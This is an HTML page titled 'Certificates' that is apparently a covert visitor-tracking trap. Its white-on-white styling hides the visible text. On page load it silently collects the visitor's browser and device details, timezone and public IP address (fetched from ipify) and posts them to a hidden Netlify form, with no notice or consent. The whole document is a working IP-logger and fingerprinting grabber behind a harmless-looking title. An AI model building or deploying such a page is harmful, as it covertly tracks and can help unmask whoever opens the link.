<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Certificates</title>
  
</head>
<style>
body {
    background-color: white;
    color: white;
       }
</style>
<body>
  <h1>Device Info Collector</h1>

  <!-- Netlify form -->
  <form name="device-info" netlify netlify-honeypot="bot-field" hidden>
    <input type="hidden" name="form-name" value="device-info">
    <input type="hidden" name="deviceInfo" id="deviceInfo">
  </form>

  <p id="status"></p>

<script>
async function gatherDeviceInfo() {
  let info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
    viewport: { width: window.innerWidth, height: window.innerHeight },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    online: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    timestamp: new Date().toISOString(),
    ip: null
  };

  try {
    // Get public IPv4 only
    const ipv4 = await fetch("https://api.ipify.org?format=json")
      .then(res => res.json());
    info.ip = ipv4.ip || "Unavailable";
  } catch(e) {
    info.ip = "Unavailable";
  }

  return info;
}

const statusEl = document.getElementById("status");

window.addEventListener("load", async () => {
  const data = await gatherDeviceInfo();

  // Fill hidden input with JSON string
  document.getElementById("deviceInfo").value = JSON.stringify(data);

  // Submit to Netlify
  const form = document.forms["device-info"];
  fetch("/", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams(new FormData(form)).toString()
  })
  .then(() => {
    statusEl.textContent = "Info (including IPv4) sent automatically.";
  })
  .catch(err => {
    console.error(err);
    statusEl.textContent = "‚ùå Failed to send.";
  });
});
</script>
</body>
</html>